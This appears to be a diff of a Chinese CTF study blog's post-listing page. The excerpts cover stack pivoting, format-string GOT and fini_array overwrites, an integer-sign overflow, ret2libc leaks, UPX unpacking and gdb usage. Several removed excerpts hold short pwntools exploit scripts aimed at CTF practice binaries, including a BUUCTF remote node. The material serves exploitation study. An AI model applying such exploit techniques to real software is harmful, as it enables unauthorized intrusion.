-payload.ljust(0x28, b&#39;\x00&#39;) 中使用 b&#39;\x00&#39; 是为了确保字符串在 printf 输出时能够正确终止，并且避免引入不必要的非空字 ...</div></div></div><div class="recent-post-item" onclick="pjax.loadUrl('/2025/07/24/UPX%E6%89%8B%E8%84%B1%E5%A3%B3/')"><div class="recent-post-info no-cover"><div class="recent-post-info-top"><div class="recent-post-info-top-tips"><a class="unvisited-post" href="/2025/07/24/UPX%E6%89%8B%E8%84%B1%E5%A3%B3/" title="UPX手脱壳">未读</a></div><a class="article-title" href="/2025/07/24/UPX%E6%89%8B%E8%84%B1%E5%A3%B3/" title="UPX手脱壳">UPX手脱壳</a></div><div class="article-meta-wrap"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days" style="font-size: 15px; display:none"></i><span class="article-meta-label">Created</span><time datetime="2025-07-24T03:27:06.000Z" title="Created 2025-07-24 11:27:06" time="2025-07-24 11:27:06">2025-07-24</time><time class="time_hidden" datetime="2025-07-24T03:27:06.337Z" title="Updated 2025-07-24 11:27:06" time="2025-07-24 11:27:06">2025-07-24</time></span></div><div class="content"></div></div></div><div class="recent-post-item" onclick="pjax.loadUrl('/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/')"><div class="recent-post-info no-cover"><div class="recent-post-info-top"><div class="recent-post-info-top-tips"><a class="unvisited-post" href="/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/" title="栈溢出进阶">未读</a></div><a class="article-title" href="/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/" title="栈溢出进阶">栈溢出进阶</a></div><div class="article-meta-wrap"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days" style="font-size: 15px; display:none"></i><span class="article-meta-label">Created</span><time datetime="2025-07-23T06:16:44.000Z" title="Created 2025-07-23 14:16:44" time="2025-07-23 14:16:44">2025-07-23</time><time class="time_hidden" datetime="2025-07-30T07:43:39.541Z" title="Updated 2025-07-30 15:43:39" time="2025-07-30 15:43:39">2025-07-30</time></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/pwn-study/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>pwn_study</span></a></span></div><div class="content">栈迁移change_ebp（栈劫持Demo1）
+                </div>
+            </li>
+        
+            <li class="home-post-item">
+
+                
+
+                <div class="home-post-item-bottom border-box">
+                    
+                    <h3 class="home-post-title border-box">
+                        <a href="/2025/07/24/UPX%E6%89%8B%E8%84%B1%E5%A3%B3/">
+                            UPX手脱壳
+                        </a>
+                    </h3>
+
+                    <div class="home-post-content keep-markdown-body">
+                        
+                            
+                        
+                    </div>
+
+                    
+
+<div class="post-meta-info-container border-box home">
+    <div class="post-meta-info border-box">
+        
+            <span class="meta-info-item border-box">
+                <i class="icon fa-solid fa-history"></i>&nbsp;<span class="home-post-history"
+                                                                                data-updated="Thu Jul 24 2025 11:27:06 GMT+0800"
+                >2025-07-24 11:27:06</span>
+            </span>
+        
+
+        
+
+        
+
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+        <a class="home-read-more" href="/2025/07/24/UPX%E6%89%8B%E8%84%B1%E5%A3%B3/">Read more&nbsp;<i class="icon fas fa-angle-right"></i></a>
+    
+</div>
+
+                </div>
+            </li>
+        
+            <li class="home-post-item">
+
+                
+
+                <div class="home-post-item-bottom border-box">
+                    
+                    <h3 class="home-post-title border-box">
+                        <a href="/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/">
+                            栈溢出进阶
+                        </a>
+                    </h3>
+
+                    <div class="home-post-content keep-markdown-body">
+                        
+                            栈迁移change_ebp（栈劫持Demo1）
 
 最多填充12个字节，只能覆盖到ebp
 
 写入的magic的范围到0x0804A380～0x0804A38C
 所以栈迁移
-脚本1234567891011121314from pwn import *p = process(&quot;./change_ebp&quot;)gdb.attach(p,&quot;b *0x080485D3&quot;)backdoor = 0x0804850Bmagic_addr = 0x0804A380p.recvuntil(&quot;leave your name\n&quot;)payload = &quot;junk&quot; + p32(backdoor) + p32(magic_addr)p.send(payload)p.interactive()
+脚本1234567891011121314from pwn import *p ...
+                        
+                    </div>
 
-ebp 的作用在函数调用时，ebp 用于：
+                    
 
-定位局部变量（如 v1 位于 ebp-8）。
-在函数返回时恢复调用者的栈帧（通过 leave 指令）。
+<div class="post-meta-info-container border-box home">
+    <div class="post-meta-info border-box">
+        
+            <span class="meta-info-item border-box">
+                <i class="icon fa-solid fa-history"></i>&nbsp;<span class="home-post-history"
+                                                                                data-updated="Wed Jul 30 2025 15:43:39 GMT+0800"
+                >2025-07-30 15:43:39</span>
+            </span>
+        
 
-典型函数尾声（leave; ret）：
-12leave  ; 相当于 mov esp, ebp ...</div></div></div><div class="recent-post-item" onclick="pjax.loadUrl('/2025/07/22/ciscn-2019-sw-1/')"><div class="recent-post-info no-cover"><div class="recent-post-info-top"><div class="recent-post-info-top-tips"><a class="unvisited-post" href="/2025/07/22/ciscn-2019-sw-1/" title="ciscn_2019_sw_1">未读</a></div><a class="article-title" href="/2025/07/22/ciscn-2019-sw-1/" title="ciscn_2019_sw_1">ciscn_2019_sw_1</a></div><div class="article-meta-wrap"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days" style="font-size: 15px; display:none"></i><span class="article-meta-label">Created</span><time datetime="2025-07-22T11:58:20.000Z" title="Created 2025-07-22 19:58:20" time="2025-07-22 19:58:20">2025-07-22</time><time class="time_hidden" datetime="2025-07-22T13:31:56.361Z" title="Updated 2025-07-22 21:31:56" time="2025-07-22 21:31:56">2025-07-22</time></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/PWN/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>PWN</span></a><a class="article-meta__tags" href="/tags/BUU/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>BUU</span></a><a class="article-meta__tags" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>格式化字符串</span></a></span></div><div class="content">
+        
+
+        
+
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+        <a class="home-read-more" href="/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/">Read more&nbsp;<i class="icon fas fa-angle-right"></i></a>
+    
+</div>
+
+                </div>
+            </li>
+        
+            <li class="home-post-item">
+
+                
+
+                <div class="home-post-item-bottom border-box">
+                    
+                    <h3 class="home-post-title border-box">
+                        <a href="/2025/07/22/ciscn-2019-sw-1/">
+                            ciscn_2019_sw_1
+                        </a>
+                    </h3>
+
+                    <div class="home-post-content keep-markdown-body">
+                        
+                            
 
 
 存在system函数，不需要泄露libc的地址
 直接把printf的got表地址覆盖为system函数的地址，然后传递参数为“&#x2F;bin&#x2F;sh”即可
 而且偏移是4
 但是该格式化字符串漏洞只被执行了一次，无法实现操作
-所以要修改收尾函数的地址以实现对格式化字符串漏洞的多次调用
-用readelf去找fini_array的地址
+所以要修改...
+                        
+                    </div>
 
-脚本
-1234567891011121314151617181920212223242526272829from pwn import *from LibcSearcher import LibcSearcher#p=process(&quot;./ciscn_2019_sw_1&quot;)p=remote(&quot;node5.buuoj.cn&quot;,29318)elf=ELF(&quot;./ciscn_2019_sw_1&quot;)fini=0x0804979cprintf=elf.got[&quot;printf&quot;]main=0x08048534sys=0x080483D0sys_h=(sys&gt;&gt;16 ...</div></div></div><div class="recent-post-item" onclick="pjax.loadUrl('/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/')"><div class="recent-post-info no-cover"><div class="recent-post-info-top"><div class="recent-post-info-top-tips"><a class="unvisited-post" href="/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="格式化字符串">未读</a></div><a class="article-title" href="/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="格式化字符串">格式化字符串</a></div><div class="article-meta-wrap"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days" style="font-size: 15px; display:none"></i><span class="article-meta-label">Created</span><time datetime="2025-07-21T01:05:48.000Z" title="Created 2025-07-21 09:05:48" time="2025-07-21 09:05:48">2025-07-21</time><time class="time_hidden" datetime="2025-08-16T11:59:29.836Z" title="Updated 2025-08-16 19:59:29" time="2025-08-16 19:59:29">2025-08-16</time></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/pwn-study/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>pwn_study</span></a><a class="article-meta__tags" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>格式化字符串</span></a></span></div><div class="content">原理格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据它解析之后的参数。
+                    
+
+<div class="post-meta-info-container border-box home">
+    <div class="post-meta-info border-box">
+        
+            <span class="meta-info-item border-box">
+                <i class="icon fa-solid fa-history"></i>&nbsp;<span class="home-post-history"
+                                                                                data-updated="Tue Jul 22 2025 21:31:56 GMT+0800"
+                >2025-07-22 21:31:56</span>
+            </span>
+        
+
+        
+
+        
+
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+        <a class="home-read-more" href="/2025/07/22/ciscn-2019-sw-1/">Read more&nbsp;<i class="icon fas fa-angle-right"></i></a>
+    
+</div>
+
+                </div>
+            </li>
+        
+            <li class="home-post-item">
+
+                
+
+                <div class="home-post-item-bottom border-box">
+                    
+                    <h3 class="home-post-title border-box">
+                        <a href="/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                            格式化字符串
+                        </a>
+                    </h3>
+
+                    <div class="home-post-content keep-markdown-body">
+                        
+                            原理格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据它解析之后的参数。
 通俗来说，格式化字符串函数的作用是将计算机内存中的数据转化为人类可读的字符串格式。
 一般来说，格式化字符串在利用的时候主要分为三个部分：
-(1）格式化字符串函数。
-(2）格式化字符串。
-(3）后续参数，可选。
-用printf(&quot;name:%s,age:%d,salary:%4.2f&quot;,myname,myage, mysalary）
-printf函数叫作格式化字符串函数，”name:%s,age:%d,salary:%4.2f”叫作格式化字符串，“myname,myage,mysalary”叫作后续参数。
-🧱 常见的格式化字符串符号
+(1）格式化...
+                        
+                    </div>
 
+                    
 
-格式符
-作用
-示例
+<div class="post-meta-info-container border-box home">
+    <div class="post-meta-info border-box">
+        
+            <span class="meta-info-item border-box">
+                <i class="icon fa-solid fa-history"></i>&nbsp;<span class="home-post-history"
+                                                                                data-updated="Sat Aug 16 2025 19:59:29 GMT+0800"
+                >2025-08-16 19:59:29</span>
+            </span>
+        
 
+        
 
+        
 
+        
 
-%x&#x2F;%p
-以十六进制形式输出栈上的值
-%x→0xdeadbeef
-%p通常带0x前缀
+        
+        
+        
+        
+    </div>
 
+    
+        <a class="home-read-more" href="/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">Read more&nbsp;<i class="icon fas fa-angle-right"></i></a>
+    
+</div>
 
-%d&#x2F;%u
-以十进制输出栈上的值
-%d→3735928559
+                </div>
+            </li>
+        
+            <li class="home-post-item">
 
+                
 
+                <div class="home-post-item-bottom border-box">
+                    
+                    <h3 class="home-post-title border-box">
+                        <a href="/2025/07/20/HarekazeCTF2019-baby-rop2/">
+                            ret2libc-printf
+                        </a>
+                    </h3>
 
-%c
-输出栈上值的最低一个字节
-%c→&#39;A&#39;
-
-
-
-%s
-把栈上的值当作地址，输出该地址的字符串
-%s→&quo ...</div></div></div><div class="recent-post-item" onclick="pjax.loadUrl('/2025/07/20/HarekazeCTF2019-baby-rop2/')"><div class="recent-post-info"><div class="recent-post-info-top"><div class="recent-post-info-top-tips"><a class="unvisited-post" href="/2025/07/20/HarekazeCTF2019-baby-rop2/" title="ret2libc-printf">未读</a></div><a class="article-title" href="/2025/07/20/HarekazeCTF2019-baby-rop2/" title="ret2libc-printf">ret2libc-printf</a></div><div class="article-meta-wrap"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days" style="font-size: 15px; display:none"></i><span class="article-meta-label">Created</span><time datetime="2025-07-20T06:53:58.000Z" title="Created 2025-07-20 14:53:58" time="2025-07-20 14:53:58">2025-07-20</time><time class="time_hidden" datetime="2025-07-20T09:27:47.719Z" title="Updated 2025-07-20 17:27:47" time="2025-07-20 17:27:47">2025-07-20</time></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/PWN/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>PWN</span></a><a class="article-meta__tags" href="/tags/BUU/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>BUU</span></a><a class="article-meta__tags" href="/tags/ret2libc-printf/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>ret2libc_printf</span></a></span></div><div class="content">严格符合printf的格式[HarekazeCTF2019]baby_rop2
+                    <div class="home-post-content keep-markdown-body">
+                        
+                            严格符合printf的格式[HarekazeCTF2019]baby_rop2
 
 
 而且函数中没有system函数和相应字符串
 要泄露libc的地址
 
 通过read读取数据，用printf打印出来
-printf 函数的 GOT 地址不能用来泄露 printf 自己的地址？
-是的，这是个鸡生蛋蛋生鸡 的问题：
+printf 函数的 GOT 地址不能用来泄露 pr...
+                        
+                    </div>
 
-printf@got 保存的是 printf 的真实地址（libc 中的地址）。
-但你要调用 printf 才能打印它，而调用 printf 又依赖 GOT 表项的地址。
-如果 GOT 表项还没解析（延迟绑定），它指向 PLT stub，不是真实地址。
-即使 GOT 表项已解析，你也无法通过 printf(&quot;%s&quot;, printf_got) 正确读取地址。
+                    
 
-🧠 总结对比
+<div class="post-meta-info-container border-box home">
+    <div class="post-meta-info border-box">
+        
+            <span class="meta-info-item border-box">
+                <i class="icon fa-solid fa-history"></i>&nbsp;<span class="home-post-history"
+                                                                                data-updated="Sun Jul 20 2025 17:27:47 GMT+0800"
+                >2025-07-20 17:27:47</span>
+            </span>
+        
 
+        
 
+        
 
+        
 
+        
+        
+        
+        
+    </div>
 
+    
+        <a class="home-read-more" href="/2025/07/20/HarekazeCTF2019-baby-rop2/">Read more&nbsp;<i class="icon fas fa-angle-right"></i></a>
+    
+</div>
 
+                </div>
+            </li>
+        
+            <li class="home-post-item">
 
+                
 
+                <div class="home-post-item-bottom border-box">
+                    
+                    <h3 class="home-post-title border-box">
+                        <a href="/2025/07/18/bjdctf-2020-babystack2/">
+                            bjdctf_2020_babystack2
+                        </a>
+                    </h3>
 
-puts(puts_got)
-✅ 可行
-puts会尝试打印从puts_got开始的内容，libc 中有字符串，不会崩溃
-
-
-printf(&quot;%s&quot;, printf_got)
-❌ 不可行
-printf会尝试从printf_got地址读取字符串，但那是个函 ...</div></div></div><div class="recent-post-item" onclick="pjax.loadUrl('/2025/07/18/bjdctf-2020-babystack2/')"><div class="recent-post-info"><div class="recent-post-info-top"><div class="recent-post-info-top-tips"><a class="unvisited-post" href="/2025/07/18/bjdctf-2020-babystack2/" title="bjdctf_2020_babystack2">未读</a></div><a class="article-title" href="/2025/07/18/bjdctf-2020-babystack2/" title="bjdctf_2020_babystack2">bjdctf_2020_babystack2</a></div><div class="article-meta-wrap"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days" style="font-size: 15px; display:none"></i><span class="article-meta-label">Created</span><time datetime="2025-07-18T09:18:45.000Z" title="Created 2025-07-18 17:18:45" time="2025-07-18 17:18:45">2025-07-18</time><time class="time_hidden" datetime="2025-07-18T09:30:00.120Z" title="Updated 2025-07-18 17:30:00" time="2025-07-18 17:30:00">2025-07-18</time></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/PWN/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>PWN</span></a><a class="article-meta__tags" href="/tags/BUU/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>BUU</span></a><a class="article-meta__tags" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>栈溢出</span></a></span></div><div class="content">
+                    <div class="home-post-content keep-markdown-body">
+                        
+                            
 只有nx保护
 
 read是栈溢出漏洞
@@ -333,263 +620,287 @@ read是栈溢出漏洞
 输入长度nbytes（要求小于10）
 但是观察到后面的read函数最多读取nbytesg个字节到buf中
 10个字节无法实现栈溢出覆盖返回地址
-又观察到 (unsigned int)nbytes是无符号整数，所以用负数会转化为无穷大的值
-脚本
-1234567891011from pwn import *#p=process(&quot;./bjdctf_2020_babystack2&quot;)#gdb.attach(p,&quot;b*0x400826&quot;)p=remote(&quot;node5.buuoj.cn&quot;,28556)p.recvuntil(b&quot;name:\n&quot;)p.sendline(str(-1))p.recvuntil(b&quot;name?\n&quot;)exit=0x6010b8payload=b&#x27;a&#x27;*(0x10+8)+p64(0x400726)p.sendline(payload)p.interactive()
+又观察到 (unsigned i...
+                        
+                    </div>
 
+                    
 
+<div class="post-meta-info-container border-box home">
+    <div class="post-meta-info border-box">
+        
+            <span class="meta-info-item border-box">
+                <i class="icon fa-solid fa-history"></i>&nbsp;<span class="home-post-history"
+                                                                                data-updated="Fri Jul 18 2025 17:30:00 GMT+0800"
+                >2025-07-18 17:30:00</span>
+            </span>
+        
 
+        
 
+        
 
-</div></div></div><div class="recent-post-item" onclick="pjax.loadUrl('/2025/07/17/Youngter-drive/')"><div class="recent-post-info no-cover"><div class="recent-post-info-top"><div class="recent-post-info-top-tips"><a class="unvisited-post" href="/2025/07/17/Youngter-drive/" title="Youngter-drive">未读</a></div><a class="article-title" href="/2025/07/17/Youngter-drive/" title="Youngter-drive">Youngter-drive</a></div><div class="article-meta-wrap"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days" style="font-size: 15px; display:none"></i><span class="article-meta-label">Created</span><time datetime="2025-07-17T12:30:33.000Z" title="Created 2025-07-17 20:30:33" time="2025-07-17 20:30:33">2025-07-17</time><time class="time_hidden" datetime="2025-07-25T09:21:20.902Z" title="Updated 2025-07-25 17:21:20" time="2025-07-25 17:21:20">2025-07-25</time></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/RE/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>RE</span></a><a class="article-meta__tags" href="/tags/BUU/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>BUU</span></a><a class="article-meta__tags" href="/tags/%E6%8E%A8%E6%B5%8B/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>推测</span></a></span></div><div class="content">
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+        <a class="home-read-more" href="/2025/07/18/bjdctf-2020-babystack2/">Read more&nbsp;<i class="icon fas fa-angle-right"></i></a>
+    
+</div>
+
+                </div>
+            </li>
+        
+            <li class="home-post-item">
+
+                
+
+                <div class="home-post-item-bottom border-box">
+                    
+                    <h3 class="home-post-title border-box">
+                        <a href="/2025/07/17/Youngter-drive/">
+                            Youngter-drive
+                        </a>
+                    </h3>
+
+                    <div class="home-post-content keep-markdown-body">
+                        
+                            
 可以看出是一个多线程
 线程分析1::hObject = CreateMutexW(0, 0, 0);
 
 
 目的： 创建一个 Mutex（互斥锁），线程之间访问共享资源时用它来保护数据。
-两个线程都会读写全局变量，比如 Dest（flag 存放的地方）、len。
-如果两个线程同时写入&#x2F;读写，会造成数据错乱，所以需要互斥锁来同步。
-当一个线程拿到 Mutex 后，另一个线程必须等它释放 Mutex 才能进入关键区。
+两个线程都会读写全局变量，比如 Dest（flag 存放的地方...
+                        
+                    </div>
 
-12hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);Thread = CreateThread(0, 0, sub_41119F, 0, 0, 0);
+                    
 
-创建线程，第三个参数是改线程要执行的函数的函数入口
-12CloseHandle(hObject);CloseHandle(Thread);
-
-关闭线程句柄（只是释放句柄资源）
-线程本身依然在后台运行，等它们的函数返回时，线程自然结束。
-（注意：这里关闭的是句柄，不是线程本身）
-1CloseHandle(::hObject);
-
-释放资源
-结束
-
-主线程 像  ...</div></div></div><div class="recent-post-item" onclick="pjax.loadUrl('/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/')"><div class="recent-post-info"><div class="recent-post-info-top"><div class="recent-post-info-top-tips"><a class="unvisited-post" href="/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/" title="gdb调试">未读</a></div><a class="article-title" href="/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/" title="gdb调试">gdb调试</a></div><div class="article-meta-wrap"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days" style="font-size: 15px; display:none"></i><span class="article-meta-label">Created</span><time datetime="2025-07-16T03:04:42.000Z" title="Created 2025-07-16 11:04:42" time="2025-07-16 11:04:42">2025-07-16</time><time class="time_hidden" datetime="2025-07-17T11:58:00.123Z" title="Updated 2025-07-17 19:58:00" time="2025-07-17 19:58:00">2025-07-17</time></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/pwn-study/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>pwn_study</span></a></span></div><div class="content">TAB：显示所有命令
-
-start:运行到程序入口处
-run:运行完整个程序
-🔍 x 命令的基本语法：x&#x2F;nfs  address
-
-n ：要显示的内存单元个数（默认是 1）。
-f ：显示格式（format），比如十六进制、十进制、字符串等。
-s ：内存单元大小（size），比如字节、半字、字等。
-address ：要查看的内存地址（可以是变量名、寄存器、指针表达式等）。
-
-f：输出格式（format）
-
-
-
-
-
-
-
-x
-Hex（十六进制）
-
-
-d
-Decimal（十进制）
-
-
-u
-Unsigned decimal
-
-
-o
-Octal（八进制）
-
-
-t
-Binary（二进制）
-
-
-f
-Floating point（浮点数）
-
-
-a
-Address（地址，显示指针）
-
-
-i
-Instruction（反汇编指令）
-
-
-c
-Char（字符）
-
-
-s
-String（字符串）
-
-
-s：内存单元大小（size）
-
-
-
-
-
-
-
-
-b
-byte（字节）
-1 字节
-
-
-h
-halfword（半字）
-2 字节
-
-
-w
-word（字）
-4 字节
-
-
-g
-giant word（双字）
-8 字节
-
- ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="anzhiyufont anzhiyu-icon-chevron-left fa-fw" style="font-weight: inherit; font-size: 1rem;"></i><div class="pagination_tips_prev">上页</div></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#content-inner">3</a><a class="extend next" rel="next" href="/page/3/#content-inner"><div class="pagination_tips_next">下页</div><i style="font-weight: inherit; font-size: 1rem;" class="anzhiyufont anzhiyu-icon-chevron-right fa-fw"></i></a><div class="toPageGroup"><input id="toPageText" oninput="value=value.replace(/[^0-9]/g,'')" maxlength="3" onkeyup="this.value=this.value.replace(/[^u4e00-u9fa5w]/g,'')" aria-label="toPage"><a id="toPageButton" onclick="anzhiyu.toPage()"><i class="anzhiyufont anzhiyu-icon-angles-right" style="font-weight: inherit; font-size: 1rem;"></i></a></div></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget"><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/BUU/" style="font-size: 1.05rem;">BUU<sup>10</sup></a><a href="/tags/Canary/" style="font-size: 1.05rem;">Canary<sup>1</sup></a><a href="/tags/NSS/" style="font-size: 1.05rem;">NSS<sup>2</sup></a><a href="/tags/PWN/" style="font-size: 1.05rem;">PWN<sup>12</sup></a><a href="/tags/RC4/" style="font-size: 1.05rem;">RC4<sup>1</sup></a><a href="/tags/RC4%E5%8F%98%E5%BC%8F/" style="font-size: 1.05rem;">RC4变式<sup>1</sup></a><a href="/tags/RE/" style="font-size: 1.05rem;">RE<sup>3</sup></a><a href="/tags/SMC/" style="font-size: 1.05rem;">SMC<sup>1</sup></a><a href="/tags/TEA/" style="font-size: 1.05rem;">TEA<sup>1</sup></a><a href="/tags/WP/" style="font-size: 1.05rem;">WP<sup>4</sup></a><a href="/tags/csu/" style="font-size: 1.05rem;">csu<sup>1</sup></a><a href="/tags/ctfshow/" style="font-size: 1.05rem;">ctfshow<sup>2</sup></a><a href="/tags/gdb/" style="font-size: 1.05rem;">gdb<sup>2</sup></a><a href="/tags/mprotect/" style="font-size: 1.05rem;">mprotect<sup>1</sup></a><a href="/tags/one-gadget/" style="font-size: 1.05rem;">one_gadget<sup>1</sup></a><a href="/tags/orw/" style="font-size: 1.05rem;">orw<sup>1</sup></a><a href="/tags/pwn-study/" style="font-size: 1.05rem;">pwn_study<sup>5</sup></a><a href="/tags/ret2libc2-x64/" style="font-size: 1.05rem;">ret2libc2_x64<sup>1</sup></a><a href="/tags/ret2libc-printf/" style="font-size: 1.05rem;">ret2libc_printf<sup>1</sup></a><a href="/tags/%E5%8A%A8%E8%B0%83/" style="font-size: 1.05rem;">动调<sup>1</sup></a><a href="/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F/" style="font-size: 1.05rem;">小端序<sup>1</sup></a><a href="/tags/%E6%8E%A8%E6%B5%8B/" style="font-size: 1.05rem;">推测<sup>1</sup></a><a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 1.05rem;">栈溢出<sup>1</sup></a><a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" style="font-size: 1.05rem;">栈迁移<sup>2</sup></a><a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 1.05rem;">格式化字符串<sup>2</sup></a><a href="/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/" style="font-size: 1.05rem;">花指令<sup>1</sup></a></div></div><hr/><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/08/"><span class="card-archive-list-date">August 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">July 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">19</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">March 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/><div class="card-webinfo"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-chart-line"></i><span>Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="webinfo-item-title"><i class="anzhiyufont anzhiyu-icon-file-lines"></i><div class="item-name">Article :</div></div><div class="item-count">26</div></div><div class="webinfo-item"><div class="webinfo-item-title"><i class="anzhiyufont anzhiyu-icon-stopwatch"></i><div class="item-name">Run time :</div></div><div class="item-count" id="runtimeshow" data-publishDate="2021-03-31T16:00:00.000Z"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></div></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2025 By <a class="footer-bar-link" href="/" title="John Doe" target="_blank">John Doe</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div 